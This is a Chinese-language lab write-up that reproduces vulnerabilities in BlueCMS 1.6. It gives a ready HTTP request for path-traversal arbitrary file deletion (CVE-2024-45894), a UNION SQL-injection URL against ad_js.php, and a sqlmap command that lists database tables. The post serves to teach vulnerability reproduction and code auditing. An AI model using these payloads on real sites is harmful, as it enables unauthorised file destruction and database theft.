#  BlueCMS 1.6漏洞复现CVE-2024-45894任意删除文件漏洞+SQL注入   
原创 TEST安全  TEST安全   2024-10-12 17:42  
  
BlueCMS 1.6漏洞复现  
CVE-2024-45894任意删除文件漏洞+SQL注入  
  
BlueCMS 1.6 安装包下载:  
```
http://www.xsssql.com/wp-content/uploads/2024/10/bluecms-master1.6.zip

```  
  
  
环境搭建:  
  
下载phpstudy，启动nignx和mysql服务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8pLcJKTvuibeZze800L2uOibymAvsGp38QBxSVMniasekTjnjV2ibaiciaZWicMK0jkptAMDPj9TlG2ZpvhveWm03CfQ/640?wx_fmt=jpeg&from=appmsg "BlueCMS 1.6任意删除文件漏洞复现CVE-2024-45894插图")  
随后创建网站，在浏览器直接访问  
  
http://127.0.0.1/install  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8pLcJKTvuibeZze800L2uOibymAvsGp38sKyM1b9BplkgpnpVxIach0zXhu6b9W03Pjt8L4h5tuJ1ibH8iamEXbew/640?wx_fmt=jpeg&from=appmsg "BlueCMS 1.6任意删除文件漏洞复现CVE-2024-45894插图1")  
  
直接下一步  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8pLcJKTvuibeZze800L2uOibymAvsGp38heL4Px8u7BAXZ4AzTibPic6ofhoGiaeVsXXKER7hrj7mPUia59M9nR2V9w/640?wx_fmt=jpeg&from=appmsg "BlueCMS 1.6任意删除文件漏洞复现CVE-2024-45894插图2")  
  
使用phpstudy创建数据库，并配置数据库信息![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8pLcJKTvuibeZze800L2uOibymAvsGp38xFLZhwW31d1hd0Y1j3jPfRlk6vtuLxbtLsbkcfCprprGN5n74s0yicg/640?wx_fmt=jpeg&from=appmsg "BlueCMS 1.6任意删除文件漏洞复现CVE-2024-45894插图3")  
  
  
安装完成后如图:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8pLcJKTvuibeZze800L2uOibymAvsGp387r67JWHVQTUaTIXJt5CXrLibLnJ8VuBGVguj44wiauicPHG0fKNoStfeQ/640?wx_fmt=jpeg&from=appmsg "BlueCMS 1.6任意删除文件漏洞复现CVE-2024-45894插图4")  
  
   
  
访问管理后台，并登录到管理后台  
  
http://127.0.0.1/admin/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8pLcJKTvuibeZze800L2uOibymAvsGp38mt2ZC6j06B3sEJrp7MChf9OOso75VUdibRULU1XxicIiaptWApPXu8mgw/640?wx_fmt=jpeg&from=appmsg "BlueCMS 1.6任意删除文件漏洞复现CVE-2024-45894插图5")  
  
通过删除robots.txt文件进行测试  
  
poc如下  
```
GET /admin/database.php?act=del&file_name=../../robots.txt HTTP/1.1
Host: 10.10.10.5
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.10.5/admin/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=6inaqq37c2kes34gfthojnbcl7
Connection: close



```  
  
直接在浏览器访问/admin/database.php?act=del&file_name=../../robots.txt 地址即可进行任意文件删除  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8pLcJKTvuibeZze800L2uOibymAvsGp383mRkkFEDgnxwscJah14pwJrr3a1qNZfckVN5TwENBqD6w2hnjSjfdg/640?wx_fmt=jpeg&from=appmsg "")  
  
以上漏洞属于CVE-2024-45894  
  
接下来我们使用seay新建项目，使用Seay进行自动审计，但这个分析只是单一的静态分析里面的代码和函数可能出现的漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8pLcJKTvuibeZze800L2uOibymAvsGp38zlUsDb7g7Awm5eCYaCicNbxbZzehT0JHpSBRFygGvOibMhiby4hL58wtg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
查看ad_js.php文件  
  
ad_js.php中有变量$ad_id，这种情况就可以优先看，因此此时变量直接拼接在where列名(ad_id)之后。在注入时，大部分的注入语句都是在while后面的一个变量，通过跟踪那个变量值来注入。像上面的变量写在order by后面的就不一定能注入成功  
  
如果  
$_GET[  
'ad_id']存在且非空，则使用  
trim()函数去除ad_id字符串两侧的空白字符，然后将结果赋值给$ ad_id。如果  
$_GET[  
'ad_id']不存在或为空，则$ ad_id被赋值为空字符串  
''。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8pLcJKTvuibeZze800L2uOibymAvsGp38vwy9Y3iaC1Gdbicp9JGU1f0v7DmKlxGjpiaIr9AiaicaiaibCqzk9pib4vY6AA/640?wx_fmt=jpeg&from=appmsg "")  
  
   
  
getone不是php的官方函数，那就是自定义函数，其功能应该是执行后面的SQL语句并将其值赋值给$ad，疑似有sql注入  
  
通过查找文件发现getone方法在/include/mysql.class.php里面，查看函数声明  
  
函数并没有过滤数据也没有进行参数化查看  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8pLcJKTvuibeZze800L2uOibymAvsGp38VuDNV61AGp4fq0icTia4eddMCbhMCwglic3wqvGRnslESGrO1aNkwCGpg/640?wx_fmt=jpeg&from=appmsg "")  
  
```
    function getone($sql, $type=MYSQL_ASSOC){
      $query = $this->query($sql,$this->linkid);
      $row = mysql_fetch_array($query, $type);
      return $row;
    }
    

```  
  
在浏览器访问测试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8pLcJKTvuibeZze800L2uOibymAvsGp38gkibiaO9RaicVHm3ibI41pkJ62qrn2jO6TMzBteibKG7docDIAfaazwLE1Q/640?wx_fmt=jpeg&from=appmsg "BlueCMS 1.6任意删除文件漏洞复现CVE-2024-45894插图10")  
  
此处为了方便查看可以把sql语句打印输出  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8pLcJKTvuibeZze800L2uOibymAvsGp38nM4MrZz7pqH9QiaU4hdHm9aUbeBtia94kviagkhbrIahBWzgmzBScWTHg/640?wx_fmt=jpeg&from=appmsg "BlueCMS 1.6任意删除文件漏洞复现CVE-2024-45894插图11")  
  
   
  
构造sql语句进行测试  
```
http://10.10.10.5/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,database()

```  
  
但是并没有结果回显。因为在getone函数执行sql语句之后并没有将结果进行输出，所以此类注入点一般采用延迟注入或者是报错注入(无回显)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8pLcJKTvuibeZze800L2uOibymAvsGp38NOFQTN9IcKsNWdhUiadVLnPo8lWC8wgh5efvvLlnROh3US7aONfeicDg/640?wx_fmt=jpeg&from=appmsg "BlueCMS 1.6任意删除文件漏洞复现CVE-2024-45894插图12")  
  
使用sqlmap进行注入:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8pLcJKTvuibeZze800L2uOibymAvsGp38oDjTOSw7d3e31NKoGYt043ShH6ConZib2TA7exGiac1r6ofr1dHY9LbA/640?wx_fmt=jpeg&from=appmsg "BlueCMS 1.6任意删除文件漏洞复现CVE-2024-45894插图13")  
  
   
  
通过sqlmay注入获取表名:  
  
sqlmap -u "http://10.10.10.5/ad_js.php?ad_id=0" -D testsce --tables  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8pLcJKTvuibeZze800L2uOibymAvsGp38X1GnUIU44QWXMDWR9HB0L1DfOEmaOic11Y8XIYzk6F9dScLZtFxdudg/640?wx_fmt=jpeg&from=appmsg "BlueCMS 1.6任意删除文件漏洞复现CVE-2024-45894插图14")  
  
  
